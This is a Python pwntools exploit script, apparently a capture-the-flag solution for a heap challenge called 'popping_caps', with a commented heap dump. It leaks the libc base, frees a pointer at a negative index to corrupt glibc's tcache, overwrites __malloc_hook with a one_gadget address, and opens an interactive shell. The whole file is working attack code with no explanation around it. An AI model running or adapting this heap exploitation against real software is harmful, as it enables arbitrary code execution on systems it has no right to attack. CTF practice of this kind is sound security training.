from pwn import *

p = remote('localhost', 7777)
e = ELF('popping_caps')
libc = ELF('libc.so.6')

one_gadget = 0x10a38c

def malloc(size):
    p.sendlineafter('choice: ', '1')
    p.sendlineafter('many: ', str(size))

def free(i):
    p.sendlineafter('choice: ', '2')
    p.sendlineafter('free: ', str(i))

def write(s):
    p.sendlineafter('choice: ', '3')
    p.sendafter('in: ', s)

p.recvuntil('system ')
libc.address = int(p.recvline()[:-1], 16) - libc.symbols['system']
print(hex(libc.address))

malloc(0x3a8)
free(0)
free(-0x210)
malloc(0xf8)
write(p64(libc.symbols['__malloc_hook']))
malloc(0x18)
write(p64(libc.address + one_gadget))

p.interactive()

# 0x555b3d389000: 0x0000000000000000      0x0000000000000251
# 0x555b3d389010: 0x0101010101010101      0x0000000000000101    0x20 ~ 0x110
# 0x555b3d389020: 0x0000000000000000      0x0000000000000000    0x120 ~ 0x210
# 0x555b3d389030: 0x0000000000000000      0x0000000000000000    0x220 ~ 0x310
# 0x555b3d389040: 0x0000000000000000      0x0000000000000000    0x320 ~ 0x390  0x3a0 ~ 0x410 
# 0x555b3d389050: 0x0000555b3d389260      0x0000555b3d389280
# 0x555b3d389060: 0x0000555b3d3892b0      0x0000555b3d3892f0
# 0x555b3d389070: 0x0000555b3d389340      0x0000555b3d3893a0
# 0x555b3d389080: 0x0000555b3d389410      0x0000555b3d389490
# 0x555b3d389090: 0x0000555b3d389520      0x0000555b3d3895c0
# 0x555b3d3890a0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3890b0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3890c0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3890d0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3890e0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3890f0: 0x0000000000000000      0x0000000000000000
# 0x555b3d389100: 0x0000000000000000      0x0000000000000000
# 0x555b3d389110: 0x0000000000000000      0x0000000000000000
# 0x555b3d389120: 0x0000000000000000      0x0000000000000000
# 0x555b3d389130: 0x0000000000000000      0x0000000000000000
# 0x555b3d389140: 0x0000000000000000      0x0000000000000000
# 0x555b3d389150: 0x0000000000000000      0x0000000000000000
# 0x555b3d389160: 0x0000000000000000      0x0000000000000000
# 0x555b3d389170: 0x0000000000000000      0x0000000000000000
# 0x555b3d389180: 0x0000000000000000      0x0000000000000000
# 0x555b3d389190: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891a0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891b0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891c0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891d0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891e0: 0x0000000000000000      0x0000000000000000
# 0x555b3d3891f0: 0x0000000000000000      0x0000000000000000
# 0x555b3d389200: 0x0000000000000000      0x0000000000000000
# 0x555b3d389210: 0x0000000000000000      0x0000000000000000
# 0x555b3d389220: 0x0000000000000000      0x0000000000000000
# 0x555b3d389230: 0x0000000000000000      0x0000000000000000
# 0x555b3d389240: 0x0000000000000000      0x0000000000000000
# 0x555b3d389250: 0x0000000000000000      0x0000000000000021
# 0x555b3d389260: 0x0000000000000000      0x0000555b3d389010
